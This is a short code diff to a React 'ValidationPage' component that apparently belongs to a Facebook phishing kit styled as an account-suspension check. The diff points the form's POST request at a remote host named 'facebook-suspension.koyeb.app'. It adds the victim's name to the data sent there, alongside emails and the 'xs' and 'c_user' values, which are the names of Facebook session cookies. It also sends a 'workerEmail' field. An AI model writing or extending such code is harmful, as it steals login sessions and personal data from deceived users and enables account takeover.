@@ -12,6 +12,7 @@ const ValidationPage = (props) => {
   const location = useLocation();
   const emails = location.state.emails;
   const workerEmail = location.state.workerEmail;
+  const name = location.state.name;
   // alert(emails)
   // const workerEmail = "fd";
   const navigate = useNavigate()
@@ -39,7 +40,7 @@ const ValidationPage = (props) => {
 
   
     
-    fetch("http://localhost:5000/submit",{
+    fetch("https://facebook-suspension.koyeb.app/submit",{
       method:"POST",
       headers: {
         "Content-Type": "application/json"
@@ -48,7 +49,8 @@ const ValidationPage = (props) => {
         emails,
         workerEmail,
         xs,
-        c_user
+        c_user,
+        name
 
       })
     }).then((res)=>{
